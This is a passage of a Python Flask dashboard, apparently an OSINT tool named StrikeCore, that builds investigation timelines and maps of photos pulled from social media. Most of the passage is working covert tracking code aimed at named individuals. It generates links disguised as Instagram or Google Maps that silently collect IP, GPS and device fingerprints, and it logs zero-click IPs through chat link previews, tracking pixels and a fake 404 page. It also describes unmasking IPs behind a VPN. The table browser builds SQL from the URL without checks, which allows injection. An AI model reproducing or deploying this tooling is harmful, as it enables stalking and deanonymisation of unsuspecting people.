        html: '<div style="background:#ffcc00;width:12px;height:12px;border-radius:3px;border:2px solid #fff;box-shadow:0 0 8px #ffcc0040;transform:rotate(45deg)"></div>',
        className: '', iconSize: [12, 12], iconAnchor: [6, 6]
      });
      var popup = '<div class="loc-popup"><div class="name">&#128205; ' + m.name + '</div><div class="src">Source: ' + m.source + '</div><div class="src">' + m.confidence + '</div></div>';
      L.marker([lat, lon], {icon: icon}).addTo(map).bindPopup(popup);
      bounds.push([lat, lon]);
      if (bounds.length === locs.length + photos.length) {
        map.fitBounds(bounds, {padding: [40, 40]});
      }
    }
  });
});

// Fit to photo bounds immediately (they have coords already)
if (bounds.length > 0) setTimeout(function() { map.fitBounds(bounds, {padding: [40, 40]}); }, 500);

// Legend
var legend = L.control({position: 'bottomright'});
legend.onAdd = function() {
  var div = L.DomUtil.create('div', 'legend');
  div.innerHTML = '<b>Map Legend</b>'
    + '<div><span style="background:#3399ff"></span> Photo (EXIF GPS)</div>'
    + '<div><span style="background:#00cc66"></span> Photo (Geotag)</div>'
    + '<div><span style="background:#ffcc00;border-radius:3px;transform:rotate(45deg)"></span> Investigation Location</div>';
  return div;
};
legend.addTo(map);
</script></body></html>''', mimetype='text/html')

@app.route('/target/<tid>/timeline')
def target_timeline(tid):
    store = InvestigationStore(tid)
    d = store.data
    events = []
    for p in d.get("phase_log", []):
        events.append({"date": p.get("timestamp", "")[:10], "type": "phase", "text": p["phase"]})
    for n in d.get("notes", []):
        events.append({"date": n.get("timestamp", "")[:10], "type": "note", "text": n["text"][:100]})
    for email, info in d.get("emails", {}).items():
        events.append({"date": info.get("first_seen", "")[:10], "type": "email", "text": email})
    events.sort(key=lambda e: e.get("date", ""))
    rows = ""
    colors = {"phase": "cyan", "note": "yellow", "email": "blue"}
    for e in events:
        c = colors.get(e["type"], "gray")
        rows += f'<tr class="table-row border-b border-white/5 text-[11px]"><td class="py-2 px-3 text-{c}-400">{e["date"]}</td><td class="py-2 px-3"><span class="badge bg-{c}-500/20 text-{c}-400">{e["type"]}</span></td><td class="py-2 px-3 text-gray-300">{e["text"]}</td></tr>'
    content = f'''<h1 class="text-xl font-bold text-white mb-6">Timeline: {tid}</h1>
    <div class="glass-bright p-4"><table class="w-full"><thead><tr class="text-gray-500 border-b border-white/10 text-xs"><th class="text-left py-2 px-3">Date</th><th class="py-2 px-3">Type</th><th class="text-left py-2 px-3">Event</th></tr></thead><tbody>{rows}</tbody></table></div>'''
    return _render(f"Timeline: {tid}", content, "inv")


@app.route('/db')
def db_info():
    import sqlite3
    db_path = str(Path.home() / "strikecore-data" / "strikecore.db")
    if not Path(db_path).exists():
        return _render("Database", '<p class="text-gray-500">No database</p>', "db")
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
    rows = ""
    for t in tables:
        count = conn.execute("SELECT COUNT(*) FROM %s" % t['name']).fetchone()[0]
        rows += f'<tr class="table-row border-b border-white/5 text-xs"><td class="py-2 px-3 text-gray-300">{t["name"]}</td><td class="py-2 px-3 text-center text-cyan-400">{count}</td><td class="py-2 px-3"><a href="/db/table/{t["name"]}" class="text-cyan-500 hover:text-cyan-300 text-[10px]">Browse</a></td></tr>'
    conn.close()
    db_size = os.path.getsize(db_path) // 1024
    content = f'''<h1 class="text-xl font-bold text-white mb-6">Database</h1>
    <div class="glass-bright p-4 mb-4"><p class="text-xs text-gray-400">Path: <code class="text-cyan-400">{db_path}</code> &middot; {db_size} KB</p></div>
    <div class="glass-bright p-4"><table class="w-full"><thead><tr class="text-gray-500 border-b border-white/10 text-xs"><th class="text-left py-2 px-3">Table</th><th class="py-2 px-3">Rows</th><th class="py-2 px-3">Action</th></tr></thead><tbody>{rows}</tbody></table></div>'''
    return _render("Database", content, "db")

@app.route('/db/table/<table_name>')
def browse_table(table_name):
    import sqlite3
    conn = sqlite3.connect(str(Path.home() / "strikecore-data" / "strikecore.db"))
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM %s LIMIT 200" % table_name).fetchall()
    cols = [d[0] for d in conn.execute("SELECT * FROM %s LIMIT 1" % table_name).description] if rows else []
    conn.close()
    header = ''.join(f'<th class="text-left py-2 px-2 text-gray-500">{c}</th>' for c in cols)
    body = ''
    for r in rows:
        body += '<tr class="table-row border-b border-white/5 text-[10px]">' + ''.join(f'<td class="py-1 px-2 text-gray-400">{str(r[c] or "")[:80]}</td>' for c in cols) + '</tr>'
    content = f'''<h1 class="text-xl font-bold text-white mb-6">{table_name} ({len(rows)})</h1>
    <div class="glass-bright p-4 overflow-x-auto"><table class="w-full"><thead><tr class="border-b border-white/10 text-xs">{header}</tr></thead><tbody>{body}</tbody></table></div>'''
    return _render(table_name, content, "db")


@app.route('/api/findings/<tid>')
def api_findings(tid):
    return jsonify(InvestigationStore(tid).data)

@app.route('/api/graph/<tid>')
def api_graph(tid):
    p = GRAPHS_DIR / f"{tid}_graph.json"
    return jsonify(json.loads(p.read_text())) if p.exists() else abort(404)




@app.route('/geoint')
def geoint_view():
    """GEOINT tools — coordinate-based intelligence."""
    content = """
    <h1 class="text-xl font-bold text-white mb-6">GEOINT Intelligence</h1>
    <div class="glass-bright p-5 mb-6" x-data="{lat:'', lon:'', place:'', loading:false, result:''}">
      <h2 class="text-sm font-semibold text-green-400 mb-3">Coordinate Lookup</h2>
      <div class="grid grid-cols-3 gap-2 mb-3">
        <input x-model="lat" type="text" placeholder="Latitude (41.89)"
          class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-green-500/50 focus:outline-none">
        <input x-model="lon" type="text" placeholder="Longitude (12.49)"
          class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-green-500/50 focus:outline-none">
        <button @click="loading=true; fetch('/api/geoint?lat='+lat+'&lon='+lon).then(r=>r.json()).then(d=>{result=JSON.stringify(d,null,2);loading=false})"
          class="px-4 py-2 bg-green-500/20 border border-green-500/30 rounded-lg text-green-400 text-xs hover:bg-green-500/30">
          <span x-show="!loading">Analyze</span><span x-show="loading" class="pulse">...</span>
        </button>
      </div>
      <div class="flex gap-2 mb-3">
        <input x-model="place" type="text" placeholder="Or enter a place name (Rome, Italy)"
          class="flex-1 bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-green-500/50 focus:outline-none">
        <button @click="loading=true; fetch('/api/geocode?q='+encodeURIComponent(place)).then(r=>r.json()).then(d=>{if(d.lat){lat=d.lat;lon=d.lon;} loading=false})"
          class="px-3 py-2 bg-cyan-500/20 border border-cyan-500/30 rounded-lg text-cyan-400 text-xs">Geocode</button>
      </div>
      <div x-show="result" class="bg-black/40 rounded-lg p-3 max-h-96 overflow-y-auto">
        <pre class="text-[10px] text-green-300 whitespace-pre-wrap" x-text="result"></pre>
      </div>
    </div>

    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
      <a href="https://worldview.earthdata.nasa.gov/" target="_blank" class="glass p-4 hover:border-blue-500/20 text-center">
        <div class="text-blue-400 text-sm font-medium">NASA Worldview</div>
        <div class="text-[10px] text-gray-500">MODIS/VIIRS Satellite</div>
      </a>
      <a href="https://www.marinetraffic.com/" target="_blank" class="glass p-4 hover:border-cyan-500/20 text-center">
        <div class="text-cyan-400 text-sm font-medium">MarineTraffic</div>
        <div class="text-[10px] text-gray-500">AIS Vessel Tracking</div>
      </a>
      <a href="https://globe.adsbexchange.com/" target="_blank" class="glass p-4 hover:border-yellow-500/20 text-center">
        <div class="text-yellow-400 text-sm font-medium">ADSBexchange</div>
        <div class="text-[10px] text-gray-500">Unfiltered Flight Data</div>
      </a>
      <a href="https://browser.dataspace.copernicus.eu/" target="_blank" class="glass p-4 hover:border-green-500/20 text-center">
        <div class="text-green-400 text-sm font-medium">Copernicus</div>
        <div class="text-[10px] text-gray-500">Sentinel Satellite Imagery</div>
      </a>
    </div>
    """
    return _render("GEOINT", content, "geoint")


@app.route('/api/geoint')
def api_geoint():
    """GEOINT API — returns full report for coordinates."""
    from core.geoint_apis import geoint_report
    lat = request.args.get("lat", type=float)
    lon = request.args.get("lon", type=float)
    if lat is None or lon is None:
        return jsonify({"error": "lat and lon required"}), 400
    return jsonify(geoint_report(lat, lon))


@app.route('/api/geocode')
def api_geocode():
    """Geocode a place name to coordinates."""
    from core.geoint_apis import geocode
    q = request.args.get("q", "")
    if not q:
        return jsonify({"error": "q parameter required"}), 400
    return jsonify(geocode(q))



@app.route('/target/<tid>/photomap')
def target_photomap(tid):
    """Interactive map with geolocated photos from social media."""
    photos_dir = Path.home() / "strikecore-data" / "photos" / tid
    markers_file = photos_dir / "photo_markers.json"

    markers = []
    if markers_file.exists():
        try:
            markers = json.loads(markers_file.read_text())
        except:
            pass

    # Filter to only markers with coordinates
    geo_markers = [m for m in markers if m.get("lat") and m.get("lon")]

    # Build JS markers array
    js_markers = json.dumps([{
        "lat": m["lat"],
        "lon": m["lon"],
        "name": m.get("location_name", ""),
        "date": m.get("date", ""),
        "caption": m.get("caption", "")[:80],
        "tagged": ", ".join(m.get("tagged", [])),
        "thumb": m.get("thumb_url", ""),
        "source": m.get("geo_source", ""),
        "post_id": m.get("post_id", ""),
    } for m in geo_markers])

    total = len(markers)
    geolocated = len(geo_markers)

    return Response("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Photo Map: __TID__</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
body{margin:0;background:#050510;font-family:"JetBrains Mono",monospace;color:#ccc}
#map{height:calc(100vh - 50px);width:100%}
.header{height:50px;background:rgba(15,15,35,0.9);border-bottom:1px solid rgba(255,50,50,0.3);display:flex;align-items:center;padding:0 20px;gap:15px}
.header h1{color:#ff3333;font-size:14px;margin:0}
.header .stats{color:#666;font-size:11px}
.header a{color:#888;font-size:11px;text-decoration:none}
.photo-popup{max-width:280px}
.photo-popup img{width:100%;border-radius:6px;margin-bottom:6px}
.photo-popup .meta{font-size:10px;color:#666;line-height:1.6}
.photo-popup .loc{color:#00cccc;font-weight:bold;font-size:11px}
.photo-popup .tagged{color:#ff6699;font-size:10px}
.photo-popup .caption{color:#aaa;font-size:10px;margin-top:4px;font-style:italic}
.legend{background:rgba(10,10,26,0.95);padding:8px 12px;border-radius:6px;border:1px solid #333;font-size:10px}
.legend div{margin:2px 0}.legend span{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px;vertical-align:middle}
</style></head><body>
<div class="header">
  <a href="/target/__TID__">&#8592;</a>
  <h1>&#128247; Photo Map</h1>
  <div class="stats">""" + str(geolocated) + """ geolocated / """ + str(total) + """ total posts</div>
</div>
<div id="map"></div>
<script>
var map = L.map('map').setView([41.9, 12.5], 5);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {maxZoom:19}).addTo(map);

var markers = """ + js_markers + """;
var bounds = [];

var iconExif = L.divIcon({html:'<div style="background:#3399ff;width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 8px rgba(51,153,255,0.5)"></div>', className:'', iconSize:[14,14]});
var iconGeotag = L.divIcon({html:'<div style="background:#00cc66;width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 8px rgba(0,204,102,0.5)"></div>', className:'', iconSize:[14,14]});
var iconInferred = L.divIcon({html:'<div style="background:#ffcc00;width:14px;height:14px;border-radius:50%;border:2px solid #fff;box-shadow:0 0 8px rgba(255,204,0,0.5)"></div>', className:'', iconSize:[14,14]});

markers.forEach(function(m) {
  var icon = m.source === 'EXIF' ? iconExif : (m.source === 'GEOTAG' ? iconGeotag : iconInferred);
  var popup = '<div class="photo-popup">';
  if (m.thumb) popup += '<img src="' + m.thumb + '" onerror="this.style.display=\'none\'">';
  popup += '<div class="loc">' + m.name + '</div>';
  popup += '<div class="meta">' + m.date + ' [' + m.source + ']</div>';
  if (m.tagged) popup += '<div class="tagged">Tagged: ' + m.tagged + '</div>';
  if (m.caption) popup += '<div class="caption">' + m.caption + '</div>';
  popup += '</div>';

  L.marker([m.lat, m.lon], {icon: icon}).addTo(map).bindPopup(popup);
  bounds.push([m.lat, m.lon]);
});

if (bounds.length > 0) map.fitBounds(bounds, {padding: [30, 30]});

var legend = L.control({position: 'bottomright'});
legend.onAdd = function() {
  var div = L.DomUtil.create('div', 'legend');
  div.innerHTML = '<b>Source</b><div><span style="background:#3399ff"></span>EXIF GPS</div><div><span style="background:#00cc66"></span>Geotag</div><div><span style="background:#ffcc00"></span>Inferred</div>';
  return div;
};
legend.addTo(map);
</script></body></html>""", mimetype='text/html')


@app.route('/api/photos/<tid>')
def api_photos(tid):
    """Get photo markers JSON for a target."""
    photos_dir = Path.home() / "strikecore-data" / "photos" / tid
    markers_file = photos_dir / "photo_markers.json"
    if markers_file.exists():
        return jsonify(json.loads(markers_file.read_text()))
    return jsonify([])



# ══════════════════════════════════════════════════════════════
# IP Tracking / Probing System
# ══════════════════════════════════════════════════════════════

# 1x1 transparent GIF (tracking pixel)
PIXEL_GIF = b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"


@app.route('/t/<tracking_id>')
def track_redirect(tracking_id):
    """Redirect tracker — logs IP then redirects to destination URL."""
    from core.ip_logger import log_hit, get_hits, LOG_DIR
    import urllib.parse

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")
    ref = request.headers.get("Referer", "")

    hit = log_hit(tracking_id, ip, ua, ref)

    # Check if there's a destination URL stored
    meta_path = LOG_DIR / (tracking_id + "_meta.json")
    dest_url = "https://www.google.com"  # default
    if meta_path.exists():
        try:
            meta = json.loads(meta_path.read_text())
            dest_url = meta.get("destination", dest_url)
        except:
            pass

    from flask import redirect
    return redirect(dest_url)


@app.route('/p/<tracking_id>.gif')
def track_pixel(tracking_id):
    """Tracking pixel — 1x1 transparent GIF that logs visitor IP."""
    from core.ip_logger import log_hit

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")
    ref = request.headers.get("Referer", "")

    datacenter_prefixes = ("2a03:2880:", "31.13.", "157.240.", "69.63.",
        "44.248.", "44.244.", "44.238.", "34.214.", "18.237.",
        "172.67.", "104.16.", "104.17.", "104.18.")
    is_datacenter = any(ip.startswith(p) for p in datacenter_prefixes)
    ua_lower = ua.lower()
    is_bot = any(c in ua_lower for c in ["facebookexternalhit", "facebot", "twitterbot", "telegrambot", "slackbot"])
    hit_type = "real_device"
    if is_bot: hit_type = "bot_crawler"
    elif is_datacenter: hit_type = "preview_fetch"
    log_hit(tracking_id, ip, ua, ref, {"method": "pixel", "hit_type": hit_type, "is_datacenter": is_datacenter})

    return Response(PIXEL_GIF, mimetype="image/gif", headers={
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Expires": "0",
    })


@app.route('/c/<tracking_id>')
def track_canary(tracking_id):
    """Canary page — looks like a normal page but logs the visitor."""
    from core.ip_logger import log_hit

    ip = _get_real_ip()
    ua = request.headers.get("User-Agent", "")

    log_hit(tracking_id, ip, ua, request.headers.get("Referer", ""), {"method": "canary"})

    # Serve a normal-looking page
    return Response("""<!DOCTYPE html><html><head><title>Page Not Found</title>
    <style>body{font-family:sans-serif;text-align:center;padding:50px;color:#333}
    h1{color:#999}p{color:#666}</style></head><body>
    <h1>404</h1><p>The page you are looking for does not exist.</p>
    </body></html>""", mimetype="text/html")


@app.route('/tracking')
def tracking_dashboard():
    """IP Tracking management — create trackers, view hits, geolocate."""
    from core.ip_logger import list_trackers, generate_tracking_id, LOG_DIR

    trackers = list_trackers()
    server_host = request.host

    tracker_rows = ""
    for t in trackers[:20]:
        ips_str = ", ".join(t.get("unique_real_ips", t["ips"])[:3])
        label = t.get("label", "")
        gps_badge = '<span class="badge bg-emerald-500/20 text-emerald-400 ml-1">GPS</span>' if t.get("has_gps") else ""
        fp_badge = '<span class="badge bg-purple-500/20 text-purple-400 ml-1">FP</span>' if t.get("has_fingerprint") else ""
        real_hits = t.get("real_hits", 0)
        devices = ", ".join(t.get("devices", [])[:3])
        tracker_rows += f"""<tr class="table-row border-b border-white/5 text-xs">
          <td class="py-2 px-3">
            <a href="/tracking/{t['id']}" class="text-cyan-400">{t['id'][:8]}</a>
            {"<span class='text-gray-500 ml-1'>" + label + "</span>" if label else ""}
          </td>
          <td class="py-2 px-3 text-center text-green-400">{t['hits']} <span class="text-gray-500">({real_hits})</span></td>
          <td class="py-2 px-3 text-gray-400">{ips_str}</td>
          <td class="py-2 px-3 text-gray-500">{devices}</td>
          <td class="py-2 px-3">{gps_badge}{fp_badge}</td>
          <td class="py-2 px-3 text-gray-500 text-[10px]">{t['last_hit'][:16]}</td>
        </tr>"""

    content = f"""
    <h1 class="text-xl font-bold text-white mb-6">IP Tracking</h1>

    <!-- Create new tracker -->
    <div class="glass-bright p-5 mb-6" x-data="{{label:'',dest:'https://www.instagram.com',tid:'',links:{{}}}}">
      <h2 class="text-sm font-semibold text-red-400 mb-3">Create Tracking Link</h2>
      <div class="grid grid-cols-3 gap-2 mb-3">
        <input x-model="label" type="text" placeholder="Label (e.g. target_mario)"
          class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-red-500/50 focus:outline-none">
        <input x-model="dest" type="text" placeholder="Destination URL (where to redirect)"
          class="bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-xs text-white placeholder-gray-600 focus:border-red-500/50 focus:outline-none">
        <button @click="fetch('/api/tracking/create',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{label:label,destination:dest}})}}).then(r=>r.json()).then(d=>{{tid=d.tracking_id;links=d.links}})"
          class="px-4 py-2 bg-red-500/20 border border-red-500/30 rounded-lg text-red-400 text-xs hover:bg-red-500/30">
          Generate</button>
      </div>
      <div x-show="tid" class="bg-black/40 rounded-lg p-3 space-y-2 text-[11px]">
        <div>Tracking ID: <code class="text-cyan-400" x-text="tid"></code></div>
        <div class="grid grid-cols-2 gap-2 mt-2">
          <div class="glass p-2">
            <div class="text-green-400 font-medium text-[10px] mb-1">Reel (click tracking + silent GPS)</div>
            <code class="text-green-300 text-[10px] break-all" x-text="links.short_redirect"></code>
          </div>
          <div class="glass p-2">
            <div class="text-emerald-400 font-medium text-[10px] mb-1">GeoLocate (explicit GPS request)</div>
            <code class="text-emerald-300 text-[10px] break-all" x-text="links.geo_locate"></code>
          </div>
          <div class="glass p-2">
            <div class="text-blue-400 font-medium text-[10px] mb-1">Link Preview (zero-click IP)</div>
            <code class="text-blue-300 text-[10px] break-all" x-text="links.link_preview"></code>
          </div>
          <div class="glass p-2">
            <div class="text-yellow-400 font-medium text-[10px] mb-1">Pixel (embed in email/HTML)</div>
            <code class="text-yellow-300 text-[10px] break-all" x-text="links.pixel"></code>
          </div>
        </div>
        <div class="text-[10px] text-gray-500 mt-2">
          <b>Reel</b>: disguised as Instagram, collects IP + GPS silently + device fingerprint, then redirects.<br>
          <b>GeoLocate</b>: asks permission for precise GPS (5-30m accuracy), disguised as Google Maps location share.<br>
          <b>Link Preview</b>: zero-click IP logging via og:image when link is shared in chat apps.<br>
          <b>Pixel</b>: embed in email HTML for open-tracking.
        </div>
      </div>
    </div>

    <!-- Active trackers -->
    <div class="glass-bright p-5">
      <div class="glass-bright p-5 mb-6">
      <h2 class="text-sm font-semibold text-yellow-400 mb-3">Zero-Click Methods</h2>
      <div class="grid grid-cols-3 gap-3 text-xs">
        <div class="glass p-3">
          <div class="text-green-400 font-medium mb-1">Link Preview</div>
          <div class="text-[10px] text-gray-500">Share <code>/lp/{id}</code> in Instagram DM, WhatsApp, Telegram. Preview generation logs IP automatically. Target doesn't need to click.</div>
        </div>
        <div class="glass p-3">
          <div class="text-blue-400 font-medium mb-1">OG Image</div>
          <div class="text-[10px] text-gray-500">The og:image in the preview page is hosted on our server. Every device that renders the preview loads it → IP logged.</div>
        </div>
        <div class="glass p-3">
          <div class="text-red-400 font-medium mb-1">WebRTC STUN</div>
          <div class="text-[10px] text-gray-500">If target opens the page, JavaScript probes STUN server to reveal real IP even behind VPN/proxy. Works on mobile browsers.</div>
        </div>
      </div>
    </div>

    <div class="glass-bright p-5">
      <h2 class="text-sm font-semibold text-cyan-400 mb-3">Active Trackers ({len(trackers)})</h2>
      <table class="w-full">
        <thead><tr class="text-gray-500 border-b border-white/10 text-xs">
          <th class="text-left py-2 px-3">ID</th><th class="py-2 px-3">Hits (Real)</th>
          <th class="text-left py-2 px-3">IPs</th><th class="py-2 px-3">Devices</th>
          <th class="py-2 px-3">Data</th><th class="py-2 px-3">Last Hit</th>
        </tr></thead>
        <tbody>{tracker_rows}</tbody>
      </table>
    </div>
    """

    return _render("IP Tracking", content, "tracking")


@app.route('/tracking/<tracking_id>')
def tracking_detail(tracking_id):
    """View detailed hits with auto-refresh."""
    from core.ip_logger import get_hits

    hits = get_hits(tracking_id)

    hit_rows = ""
    map_markers = []
    real_hits = [h for h in hits if h.get("hit_type") == "real_device"]
    preview_hits = [h for h in hits if h.get("hit_type") == "preview_fetch"]
    bot_hits = [h for h in hits if h.get("hit_type") == "bot_crawler"]
    
    gps_markers = []  # precise GPS pins

    for h in hits:
        geo = h.get("geo", {})
        device = h.get("device", "?")
        hit_type = h.get("hit_type", "unknown")
        from_ig = "IG" if h.get("from_instagram") else ""

        if hit_type == "real_device":
            row_color = "border-green-500/20"
            type_badge = '<span class="badge bg-green-500/20 text-green-400">REAL</span>'
        elif hit_type == "preview_fetch":
            row_color = "border-yellow-500/10"
            type_badge = '<span class="badge bg-yellow-500/20 text-yellow-400">PREVIEW</span>'
        else:
            row_color = "border-gray-500/10"
            type_badge = '<span class="badge bg-gray-500/20 text-gray-400">BOT</span>'

        ig_badge = ' <span class="badge bg-pink-500/20 text-pink-400">IG</span>' if from_ig else ""

        # GPS precision column
        gps_lat = h.get("gps_lat")
        gps_lon = h.get("gps_lon")
        gps_acc = h.get("gps_accuracy_m")
        gps_src = h.get("geo_source", "")
        if gps_lat and gps_lat != 0:
            gps_cell = f'<span class="text-green-400">{gps_acc:.0f}m</span> <span class="text-gray-600">({gps_src})</span>'
            gps_markers.append({
                "lat": gps_lat, "lon": gps_lon, "acc": gps_acc or 50,
                "ip": h.get("ip", "?"), "device": device,
                "time": h.get("timestamp", "")[:16],
                "src": gps_src,
            })
        else:
            gps_cell = '<span class="text-gray-600">-</span>'

        # Browser / OS info
        browser = h.get("browser", "")
        os_info = h.get("os", "")
        if os_info:
            device_cell = f'{device} <span class="text-gray-600">{os_info}</span>'
        else:
            device_cell = device

        hit_rows += f"""<tr class="table-row border-b {row_color} text-[11px]">
          <td class="py-2 px-3 text-gray-400">{h.get('timestamp','')[:19]}</td>
          <td class="py-2 px-3">{type_badge}{ig_badge}</td>
          <td class="py-2 px-3 text-cyan-400">{h.get('ip','?')[:20]}</td>
          <td class="py-2 px-3 text-gray-300">{geo.get('city','?')}, {geo.get('country','?')}</td>
          <td class="py-2 px-3">{device_cell}</td>
          <td class="py-2 px-3 text-gray-500">{geo.get('isp','?')[:25]}</td>
          <td class="py-2 px-3">{gps_cell}</td>
        </tr>"""

        if geo.get("lat") and geo.get("lon"):
            map_markers.append({
                "lat": geo["lat"], "lon": geo["lon"],
                "ip": h.get("ip", "?"),
                "city": geo.get("city", "?"),
                "country": geo.get("country", "?"),
                "device": device,
                "time": h.get("timestamp", "")[:16],
                "from_ig": h.get("from_instagram", False),
            })

    markers_json = json.dumps(map_markers)
    gps_markers_json = json.dumps(gps_markers)
    unique_ips = len(set(h.get("ip") for h in hits))
    ig_hits = sum(1 for h in hits if h.get("from_instagram"))
    real_count = sum(1 for h in hits if h.get("hit_type") == "real_device")
    preview_count = sum(1 for h in hits if h.get("hit_type") == "preview_fetch")
    gps_count = len(gps_markers)

    # Get best location and fingerprints
    from core.ip_logger import get_best_location, get_fingerprints
    best_loc = get_best_location(tracking_id)
    fingerprints = get_fingerprints(tracking_id)

    best_loc_html = ""
    if best_loc.get("lat"):
        src_label = "GPS" if best_loc.get("source", "").startswith("gps") else "IP Geo"
        acc_color = "green" if best_loc.get("accuracy_m", 99999) < 500 else ("yellow" if best_loc.get("accuracy_m", 99999) < 10000 else "red")
        addr_str = best_loc.get("address", "")
        if not addr_str:
            addr_str = f"{best_loc.get('city', '?')}, {best_loc.get('country', '?')}"
        road = best_loc.get("road", "")
        suburb = best_loc.get("suburb", "")
        detail = f"{road}, {suburb}" if road else suburb
        best_loc_html = f"""
    <div class="glass-bright p-4 mb-4 border border-{acc_color}-500/30 glow-{acc_color}">
      <div class="flex items-center gap-2 mb-2">
        <span class="text-{acc_color}-400 text-sm font-bold">BEST KNOWN LOCATION</span>
        <span class="badge bg-{acc_color}-500/20 text-{acc_color}-400">{src_label}</span>
        <span class="badge bg-gray-500/20 text-gray-400">{best_loc.get('accuracy_m', '?')}m accuracy</span>
      </div>
      <div class="text-white text-sm">{addr_str}</div>
      {"<div class='text-gray-400 text-xs mt-1'>" + detail + "</div>" if detail.strip(", ") else ""}
      <div class="text-gray-500 text-[10px] mt-1">{best_loc.get('lat', 0):.6f}, {best_loc.get('lon', 0):.6f} — {best_loc.get('timestamp', '')[:16]}</div>
    </div>"""

    fp_html = ""
    if fingerprints:
        fp = fingerprints[-1]  # most recent
        fp_items = []
        for k in ["screen_w", "screen_h", "pixel_ratio", "timezone", "language", "platform",
                   "cpu_cores", "ram_gb", "webgl_renderer", "connection_type", "battery_level",
                   "battery_charging", "touch_points", "device_model"]:
            v = fp.get(k)
            if v is not None and v != "" and v != 0:
                fp_items.append(f'<span class="text-gray-400">{k}:</span> <span class="text-gray-200">{v}</span>')
        if fp_items:
            fp_html = f"""
    <div class="glass-bright p-4 mb-4">
      <h2 class="text-sm font-semibold text-purple-400 mb-2">Device Fingerprint</h2>
      <div class="flex flex-wrap gap-x-4 gap-y-1 text-[11px]">{"".join("<div>" + i + "</div>" for i in fp_items)}</div>
    </div>"""

    content = f"""
    <h1 class="text-xl font-bold text-white mb-2">Tracker: {tracking_id}</h1>

    <!-- Live notification banner (hidden by default) -->
    <div id="new-hit-banner" style="display:none" class="glass p-3 mb-4 border border-green-500/30 glow-green">
      <div class="flex items-center gap-3">
        <div class="w-3 h-3 bg-green-500 rounded-full pulse"></div>
        <span class="text-green-400 text-sm font-bold">NEW HIT DETECTED</span>
        <span id="new-hit-info" class="text-gray-400 text-xs"></span>
        <button onclick="location.reload()" class="ml-auto px-3 py-1 bg-green-500/20 border border-green-500/30 rounded text-green-400 text-xs">Show Details</button>
      </div>
    </div>

    {best_loc_html}

    <div class="flex flex-wrap gap-3 mb-6">
      <div class="glass p-3"><span class="text-[10px] text-gray-400">Total Hits</span><div class="stat-num text-cyan-400" style="font-size:1.5rem" id="hit-count">{len(hits)}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">Unique IPs</span><div class="stat-num text-green-400" style="font-size:1.5rem" id="unique-count">{unique_ips}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">Real Devices</span><div class="stat-num text-green-400" style="font-size:1.5rem">{real_count}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">GPS Fixes</span><div class="stat-num text-emerald-400" style="font-size:1.5rem">{gps_count}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">From Instagram</span><div class="stat-num text-pink-400" style="font-size:1.5rem" id="ig-count">{ig_hits}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">Previews</span><div class="stat-num text-yellow-400" style="font-size:1.5rem">{preview_count}</div></div>
      <div class="glass p-3"><span class="text-[10px] text-gray-400">Status</span><div class="text-xs text-gray-300" id="poll-status">Polling...</div></div>
    </div>

    {fp_html}

    <!-- Audio notification -->
    <audio id="notify-sound" preload="auto"><source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdH2JkZuTjHhybHiAg4OAgX2Af4SDhYaFg4F+fX6Af4CDhIWEgYB+fn+AgYOEhYSCgH5+f4CBg4SFhIKAfn5/gIGDhIWEgoB+fn+AgYOEhYSBgH5+f4CBg4SFhIKAfn5/gIGDhIWEgoB+fn+AgYOEhQ==" type="audio/wav"></audio>

    <script>
    var lastCount = {len(hits)};
    var tid = "{tracking_id}";

    function pollHits() {{
      fetch("/api/tracking/hits/" + tid)
        .then(function(r) {{ return r.json(); }})
        .then(function(data) {{
          document.getElementById("hit-count").textContent = data.total;
          document.getElementById("unique-count").textContent = data.unique_ips;
          document.getElementById("ig-count").textContent = data.ig_hits;
          document.getElementById("poll-status").textContent = "Live (" + new Date().toLocaleTimeString() + ")";

          if (data.total > lastCount) {{
            // NEW HIT!
            lastCount = data.total;
            var banner = document.getElementById("new-hit-banner");
            banner.style.display = "block";
            document.getElementById("new-hit-info").textContent =
              data.total + " hits, " + data.unique_ips + " unique IPs, " + data.ig_hits + " from Instagram";

            // Play sound
            try {{ document.getElementById("notify-sound").play(); }} catch(e) {{}}

            // Browser notification
            if (Notification.permission === "granted") {{
              new Notification("StrikeCore: New Hit!", {{
                body: data.total + " hits on tracker " + tid,
                icon: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎯</text></svg>"
              }});
            }}

            // Auto-reload after 3 seconds to show full details
